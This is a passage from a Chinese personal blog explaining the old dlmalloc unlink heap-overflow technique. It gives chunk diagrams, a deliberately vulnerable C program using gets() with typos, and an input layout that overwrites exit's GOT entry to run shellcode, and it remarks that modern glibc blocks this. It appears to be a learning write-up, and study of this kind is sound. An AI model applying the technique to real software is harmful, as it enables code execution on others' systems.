       <span class="comment">上一块大小</span>           &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd2所指向自由块的开始位置</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
        <span class="comment">本块大小</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向下一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">fd3</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
<span class="comment">指向上一块自由块地址的指针</span>  &lt;<span class="literal">-</span><span class="literal">-</span> <span class="comment">bk3</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
    <span class="comment">未使用的区块部分</span>
     <span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span>
<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>
</code></pre><p>为了合并两个小块为一个大块，提高内存分配效率，其中有个unlink过程，简单说就是把第二个自由块从一个自由块位置的指针链表中去掉，再把两边的块接上。</p>
<p>这时产生的结果有：</p>
<ul>
<li>fd1(bk2+8位置)的内容更改为fd2</li>
<li>bk3(fd2+12位置)的内容更改为bk2</li>
</ul>
<h2 id="创造unlinking的条件">创造unlinking的条件</h2><p>就是说，让malloc以为有两个连续自由块需要合并。我们可以通过操作内存块的尺寸部分来完成这一切。</p>
<p>可以这么理解malloc的行为，当准备free一块内存，比如对某个分配的内存buf，malloc会先将buf的地址加上buf-4的尺寸来得到下一块内存的地址，比如说是buf2，检查buf2-4位置的最后一个一个标志位，如果标志位为0，表示上一块也是自由块，那么malloc觉得就应该合并这两块即unlink就会发生。</p>
<p>那么，我们通过溢出操纵尺寸大小和标志位就可以操纵malloc的行为，通过覆盖自由区块中的fd和bk指针从而改写任意内存地址(我只能感慨有些人太天才了，把明明是用来分配内存的东西拿来改写任意内存地址= =)</p>
<h2 id="改写任意内存">改写任意内存</h2><p>以下例子通过更改尺寸伪造了一个内存块，然后把buf2 unlink掉。</p>
<p>先来一个倒霉的可以堆溢出程序，比如我们已经有了一个24字节的shellcode。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char *buf1, *buf2;</span><br><span class="line">buff1 = malloc(<span class="number">40</span>);</span><br><span class="line">buff2 = malloc(<span class="number">40</span>);</span><br><span class="line">gets(buf1);</span><br><span class="line">free(buf1);</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译它。然后运行它。输入<code>\xeb\x08</code>(jmp short 10)<code>+ shellcode + 无用字符占位 + ‘0xfffffffc’</code>(-4)<code>X 2 + (GOT中exit地址-12) + buff1的地址</code></p>
<p>以上所做的是更改GOT中exit的地址。你可以通过<code>objdump</code>查看</p>
<p>于是程序退出调用的exit函数就被替换成buff1的地址了。</p>
<p>最后得到的堆如下所示：</p>
<pre><code>+++++++++++++++++++++++++
       上一块大小           &lt;-- buf1-<span class="number">8</span>
+++++++++++++++++++++++++
        本块大小
+++++++++++++++++++++++++
<span class="string">|\xeb |\x08 |占位 |占位 |   &lt;-- buf1开始的位置， 伪造块头部1</span>
<span class="string">|占位 |占位 |占位 |占位 |   &lt;-- 伪造块头部2</span>
<span class="string">|占位 |占位 |占位 |占位 |   &lt;-- 即将被更改的伪造块fd(即buf2的bk2+8位置)</span>
<span class="string">|                       |</span>
<span class="string">|                       |</span>
<span class="string">|       shellcode       |</span>
<span class="string">|                       |</span>
<span class="string">|                       |</span>
<span class="string">|                       |</span>
<span class="string">|占位 |占位 |占位 |占位 |   </span>
+++++++++++++++++++++++++   
<span class="string">|\xff |\xff |\xff |\xfc |   </span>
+++++++++++++++++++++++++
<span class="string">|\xff |\xff |\xff |\xfc |   </span>
+++++++++++++++++++++++++
<span class="string">|exit函数在GOT中地址-12 |  &lt;-- buf2的fd2</span>
+++++++++++++++++++++++++  
<span class="string">|      buf1的地址       |  &lt;-- buf2的bk2</span>
    ......
    ......
+++++++++++++++++++++++++
</code></pre><p>于是，当buf1被free之时，malloc通过检查buf2接下来一块的标志位来查看下一块是否为自由块。因为buf2大小被改为-4，倒霉的malloc就开始检查buf2-8位置，发现buf2是自由块，于是准备unlink来合并buf1和buf2。结果fd2+12被更改为bk2，bk2+8会被更改为fd2来把buf2从一个自由块双向链表中unlink掉。</p>
<p>那么具体细节请参照:<a href="http://etutorials.org/Networking/network+security+assessment/Chapter+13.+Application-Level+Risks/13.5+Heap+Overflows/" target="_blank" rel="external">Heap Overflows</a></p>
<h2 id="实践">实践</h2><p>现在的glibc(大概2.25以来，忘记了)中malloc的实现，在free之前都会有一个检查部分，如果发现堆溢出覆盖发生，那么就会</p>
<pre><code><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> glibc detected <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span> ./heap: free(): invalid next size (fast): 0x0804b008 <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
</code></pre><p>我在gdb中看了看，似乎前一个块的地址也不再用了，听说有些其它的保护方法让负的地址也不起作用了。</p>
<p>总之，所以别指望在一台现代操作系统中<a href="并不是说堆溢出没有用，也许不能执行任意代码，但还有其它可能。">^3</a>尝试成功。如果对如何绕过这些防范措施有兴趣可以看看<a href="http://overflowedminds.net/Papers/newlog/linux_heap_exploiting_revisited.pdf" target="_blank" rel="external">Linux Heap Exploiting Revisited(西班牙语)</a></p>
<h2 id="参考资料">参考资料</h2><ul>
<li><a href="http://stackoverflow.com/questions/9646608/use-a-heap-overflow-to-write-arbitrary-data" target="_blank" rel="external">Use a heap overflow to write arbitrary data</a></li>
<li><a href="http://etutorials.org/Networking/network+security+assessment/Chapter+13.+Application-Level+Risks/13.5+Heap+Overflows/" target="_blank" rel="external">Heap Overflows</a></li>
<li><a href="http://www.h-online.com/security/features/A-Heap-of-Risk-747161.html?view=print" target="_blank" rel="external">A heap of risk: Buffer overflows on the heap and how they are exploited</a></li>
</ul>
<p>你可以在上面的链接找到其它资料。</p>
<p>最后吐槽下，草泥马的天朝网络！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
<h1 id="FootNotes">FootNotes</h1><p>[^1]: <a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="external">A Memory Allocator</a> by Doug Lea</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">176</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">62</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/9/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
